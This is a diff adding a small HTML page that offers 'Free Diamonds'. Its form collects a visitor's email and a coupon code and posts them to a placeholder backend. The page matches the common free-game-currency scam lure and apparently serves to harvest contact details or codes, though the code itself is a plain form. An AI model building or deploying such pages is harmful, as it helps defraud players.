@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Diamonds</title>
+  <style>
+    body { background:#111; color:#fff; text-align:center; font-family:Arial; }
+    .box { width:300px; margin:auto; background:#222; padding:20px; border-radius:10px; }
+    input, select, button {
+      width:90%; padding:10px; margin:5px;
+      border:none; border-radius:5px;
+    }
+    button { background:#00ffcc; cursor:pointer; }
+  </style>
+</head>
+<body>
+
+<h1>💎 Free Diamonds 💎</h1>
+
+<div class="box">
+  <select id="diamond">
+    <option value="10000">10,000 Diamonds</option>
+    <option value="5000">5,000 Diamonds</option>
+    <option value="20000">20,000 Diamonds</option>
+    <option value="500">500 Diamonds</option>
+  </select>
+
+  <input id="email" placeholder="Your Email">
+  <input id="coupon" placeholder="Coupon Code">
+
+  <button onclick="send()">Submit</button>
+</div>
+
+<script>
+function send(){
+  fetch("https://YOUR-BACKEND-URL/send",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      email: email.value,
+      coupon: coupon.value,
+      diamond: diamond.value
+    })
+  })
+  .then(r=>r.json())
+  .then(d=>alert(d.message));
+}
+</script>
+
+</body>
+  </html>
